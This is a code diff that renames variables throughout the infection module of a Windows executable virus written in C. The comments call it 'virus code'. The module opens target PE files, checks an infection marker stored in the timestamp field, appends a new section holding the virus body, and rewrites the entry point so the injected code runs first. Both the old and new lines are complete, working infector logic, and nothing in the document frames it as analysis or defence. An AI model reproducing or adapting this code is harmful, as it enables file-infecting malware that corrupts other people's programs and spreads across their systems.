@@ -4,41 +4,41 @@
 #include "utility.h"
 
 typedef struct {
-    HANDLE hFile;
-    HANDLE hMap;
-    void *startAddress;
+    HANDLE h_file;
+    HANDLE h_map;
+    void *start_address;
     DWORD size;
 } file_view_t;
 
 static int can_infect(const char *filename, data_t *data);
-static void modify_headers(IMAGE_NT_HEADERS *ntHeaders, uint32_t codeSize);
-static void *copy_code(IMAGE_NT_HEADERS *ntHeaders, file_view_t *fileView,
+static void modify_headers(IMAGE_NT_HEADERS *nt_headers, uint32_t code_size);
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view,
                        data_t *data);
-static void modify_entrypoint(IMAGE_NT_HEADERS *ntHeaders, uint32_t entryOffset,
-                              void *targetCodeBegin);
+static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers, uint32_t entry_offset,
+                              void *target_code_begin);
 static uint32_t get_extended_file_size(const char *filename, data_t *data);
-static int open_file_view(const char *filename, file_view_t *fileView,
+static int open_file_view(const char *filename, file_view_t *file_view,
                           data_t *data);
-static void close_file_view(file_view_t *fileView, data_t *data);
+static void close_file_view(file_view_t *file_view, data_t *data);
 
 int infect(const char *filename, data_t *data) {
     int ret = 0;
     if (can_infect(filename, data)) {
-        file_view_t fileView;
-        memzero(&fileView, sizeof(file_view_t));
+        file_view_t file_view;
+        memzero(&file_view, sizeof(file_view_t));
 
-        uint32_t extendedSize = get_extended_file_size(filename, data);
-        fileView.size = extendedSize;
-        if (open_file_view(filename, &fileView, data) == 0) {
-            IMAGE_NT_HEADERS *ntHeaders = get_nt_header(fileView.startAddress);
-            modify_headers(ntHeaders, data->codeSize);
-            void *targetCodeBegin = copy_code(ntHeaders, &fileView, data);
-            modify_entrypoint(ntHeaders, data->entryOffset, targetCodeBegin);
+        uint32_t extended_size = get_extended_file_size(filename, data);
+        file_view.size = extended_size;
+        if (open_file_view(filename, &file_view, data) == 0) {
+            IMAGE_NT_HEADERS *nt_headers = get_nt_header(file_view.start_address);
+            modify_headers(nt_headers, data->code_size);
+            void *target_code_begin = copy_code(nt_headers, &file_view, data);
+            modify_entrypoint(nt_headers, data->entry_offset, target_code_begin);
 
-            data->functions.flushViewOfFile(fileView.startAddress,
-                                            extendedSize);
+            data->function_list.flushViewOfFile(file_view.start_address,
+                                            extended_size);
 
-            close_file_view(&fileView, data);
+            close_file_view(&file_view, data);
         } else {
             ret = 1;
         }
@@ -48,54 +48,54 @@ int infect(const char *filename, data_t *data) {
     return ret;
 }
 
-static void modify_headers(IMAGE_NT_HEADERS *ntHeaders, uint32_t codeSize) {
-    create_section_header(get_last_section_header(ntHeaders) + 1, ntHeaders,
-                          codeSize);
-    IMAGE_SECTION_HEADER *newSector = get_last_section_header(ntHeaders);
+static void modify_headers(IMAGE_NT_HEADERS *nt_headers, uint32_t code_size) {
+    create_section_header(get_last_section_header(nt_headers) + 1, nt_headers,
+                          code_size);
+    IMAGE_SECTION_HEADER *new_sector = get_last_section_header(nt_headers);
 
-    ntHeaders->FileHeader.TimeDateStamp = INFECTION_MARKER;
+    nt_headers->FileHeader.TimeDateStamp = INFECTION_MARKER;
     // original sizes are already aligned, so add only aligned increase (and not
     // align(orig + inc))
-    // ntHeaders->OptionalHeader.SizeOfCode += align_value(codeSize,
-    // ntHeaders->OptionalHeader.FileAlignment);
-    ntHeaders->OptionalHeader.SizeOfCode +=
-        align_value(codeSize, ntHeaders->OptionalHeader.FileAlignment);
-    if (ntHeaders->OptionalHeader.SizeOfCode <
-        newSector->PointerToRawData + newSector->SizeOfRawData -
-            ntHeaders->OptionalHeader.BaseOfCode) {
-        ntHeaders->OptionalHeader.SizeOfCode =
-            align_value(newSector->PointerToRawData + newSector->SizeOfRawData -
-                            ntHeaders->OptionalHeader.BaseOfCode,
-                        ntHeaders->OptionalHeader.FileAlignment);
+    // nt_headers->OptionalHeader.SizeOfCode += align_value(code_size,
+    // nt_headers->OptionalHeader.FileAlignment);
+    nt_headers->OptionalHeader.SizeOfCode +=
+        align_value(code_size, nt_headers->OptionalHeader.FileAlignment);
+    if (nt_headers->OptionalHeader.SizeOfCode <
+        new_sector->PointerToRawData + new_sector->SizeOfRawData -
+            nt_headers->OptionalHeader.BaseOfCode) {
+        nt_headers->OptionalHeader.SizeOfCode =
+            align_value(new_sector->PointerToRawData + new_sector->SizeOfRawData -
+                            nt_headers->OptionalHeader.BaseOfCode,
+                        nt_headers->OptionalHeader.FileAlignment);
     }
-    ntHeaders->OptionalHeader.SizeOfImage +=
-        align_value(codeSize + sizeof(IMAGE_SECTION_HEADER),
-                    ntHeaders->OptionalHeader.SectionAlignment);
-    ntHeaders->OptionalHeader.SizeOfHeaders += align_value(
-        sizeof(IMAGE_SECTION_HEADER), ntHeaders->OptionalHeader.FileAlignment);
+    nt_headers->OptionalHeader.SizeOfImage +=
+        align_value(code_size + sizeof(IMAGE_SECTION_HEADER),
+                    nt_headers->OptionalHeader.SectionAlignment);
+    nt_headers->OptionalHeader.SizeOfHeaders += align_value(
+        sizeof(IMAGE_SECTION_HEADER), nt_headers->OptionalHeader.FileAlignment);
 }
 
-static void *copy_code(IMAGE_NT_HEADERS *ntHeaders, file_view_t *fileView,
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view,
                        data_t *data) {
-    IMAGE_SECTION_HEADER *sectionHeader = get_last_section_header(ntHeaders);
-    void *targetCodeBegin =
-        (uint8_t *)fileView->startAddress + sectionHeader->PointerToRawData;
-    memcp(data->codeBegin, targetCodeBegin, data->codeSize);
-    return targetCodeBegin;
+    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
+    void *target_code_begin =
+        (uint8_t *)file_view->start_address + section_header->PointerToRawData;
+    memcp(data->code_begin_addr, target_code_begin, data->code_size);
+    return target_code_begin;
 }
 
 // virus code must already been copied to target file!
-static void modify_entrypoint(IMAGE_NT_HEADERS *ntHeaders, uint32_t entryOffset,
-                              void *targetCodeBegin) {
-    uint32_t oep = ntHeaders->OptionalHeader.ImageBase +
-                   ntHeaders->OptionalHeader.AddressOfEntryPoint;
-    if (write_original_entry_point(oep, targetCodeBegin) != 0) {
+static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers, uint32_t entry_offset,
+                              void *target_code_begin) {
+    uint32_t oep = nt_headers->OptionalHeader.ImageBase +
+                   nt_headers->OptionalHeader.AddressOfEntryPoint;
+    if (write_original_entry_point(oep, target_code_begin) != 0) {
         PRINT_DEBUG("could not save original entry point\n");
     }
 
-    IMAGE_SECTION_HEADER *sectionHeader = get_last_section_header(ntHeaders);
-    ntHeaders->OptionalHeader.AddressOfEntryPoint =
-        sectionHeader->VirtualAddress + entryOffset;
+    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
+    nt_headers->OptionalHeader.AddressOfEntryPoint =
+        section_header->VirtualAddress + entry_offset;
 }
 
 static int can_infect(const char *filename, data_t *data) {
@@ -107,23 +107,23 @@ static int can_infect(const char *filename, data_t *data) {
         return 0;
     }
 
-    if (!is_pe(fw.startAddress)) {
+    if (!is_pe(fw.start_address)) {
         PRINT_DEBUG("can't infect \"%s\": no valid pe\n", filename);
         close_file_view(&fw, data);
         return 0;
     }
 
-    IMAGE_NT_HEADERS *ntHeaders = get_nt_header(fw.startAddress);
-    IMAGE_SECTION_HEADER *sectionHeader =
-        get_section_header(ntHeaders, ntHeaders->FileHeader.NumberOfSections);
+    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
+    IMAGE_SECTION_HEADER *section_header =
+        get_section_header(nt_headers, nt_headers->FileHeader.NumberOfSections);
 
-    if (!is_section_header_empty(sectionHeader)) {
+    if (!is_section_header_empty(section_header)) {
         PRINT_DEBUG("can't infect \"%s\": no additional empty section header\n",
                     filename);
         close_file_view(&fw, data);
         return 0;
     }
-    if (ntHeaders->FileHeader.TimeDateStamp == INFECTION_MARKER) {
+    if (nt_headers->FileHeader.TimeDateStamp == INFECTION_MARKER) {
         PRINT_DEBUG("can't infect \"%s\": already infected\n", filename);
         close_file_view(&fw, data);
         return 0;
@@ -139,55 +139,55 @@ static uint32_t get_extended_file_size(const char *filename, data_t *data) {
         PRINT_DEBUG("could not open view of file\n");
         return 0;
     }
-    IMAGE_NT_HEADERS *ntHeaders = get_nt_header(fw.startAddress);
-    uint32_t extendedSize =
-        fw.size + ntHeaders->OptionalHeader.FileAlignment +
-        align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
+    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
+    uint32_t extended_size =
+        fw.size + nt_headers->OptionalHeader.FileAlignment +
+        align_value(data->code_size, nt_headers->OptionalHeader.FileAlignment);
     close_file_view(&fw, data);
-    return extendedSize;
+    return extended_size;
 }
 
-static int open_file_view(const char *filename, file_view_t *fileView,
+static int open_file_view(const char *filename, file_view_t *file_view,
                           data_t *data) {
-    fileView->hFile =
-        data->functions.createFileA(filename, GENERIC_READ | GENERIC_WRITE,
+    file_view->h_file =
+        data->function_list.create_file_a(filename, GENERIC_READ | GENERIC_WRITE,
                                     FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-    if (fileView->hFile == INVALID_HANDLE_VALUE) {
+    if (file_view->h_file == INVALID_HANDLE_VALUE) {
         return 1;
     }
-    if (fileView->size == 0) {
-        fileView->size =
-            (DWORD)data->functions.getFileSize(fileView->hFile, NULL);
-        if (fileView->size == INVALID_FILE_SIZE) {
-            data->functions.closeHandle(fileView->hFile);
+    if (file_view->size == 0) {
+        file_view->size =
+            (DWORD)data->function_list.get_file_size(file_view->h_file, NULL);
+        if (file_view->size == INVALID_FILE_SIZE) {
+            data->function_list.close_handle(file_view->h_file);
             return 2;
         }
     }
 
-    fileView->hMap = data->functions.createFileMappingA(
-        fileView->hFile, NULL, PAGE_READWRITE, 0, fileView->size, NULL);
+    file_view->h_map = data->function_list.create_file_mapping_a(
+        file_view->h_file, NULL, PAGE_READWRITE, 0, file_view->size, NULL);
 
-    if (fileView->hMap == NULL) {
-        data->functions.closeHandle(fileView->hFile);
+    if (file_view->h_map == NULL) {
+        data->function_list.close_handle(file_view->h_file);
         return 3;
     }
 
-    fileView->startAddress = (void *)data->functions.mapViewOfFile(
-        fileView->hMap, FILE_MAP_ALL_ACCESS, 0, 0, fileView->size);
+    file_view->start_address = (void *)data->function_list.map_view_of_file(
+        file_view->h_map, FILE_MAP_ALL_ACCESS, 0, 0, file_view->size);
 
-    if (fileView->startAddress == NULL) {
-        data->functions.closeHandle(fileView->hMap);
-        data->functions.closeHandle(fileView->hFile);
+    if (file_view->start_address == NULL) {
+        data->function_list.close_handle(file_view->h_map);
+        data->function_list.close_handle(file_view->h_file);
         return 4;
     }
     return 0;
 }
 
-static void close_file_view(file_view_t *fileView, data_t *data) {
-    data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
-    data->functions.closeHandle(fileView->hMap);
-    data->functions.closeHandle(fileView->hFile);
-    memzero(fileView, sizeof(file_view_t));
+static void close_file_view(file_view_t *file_view, data_t *data) {
+    data->function_list.unmap_view_of_file((LPCVOID)file_view->start_address);
+    data->function_list.close_handle(file_view->h_map);
+    data->function_list.close_handle(file_view->h_file);
+    memzero(file_view, sizeof(file_view_t));
 }
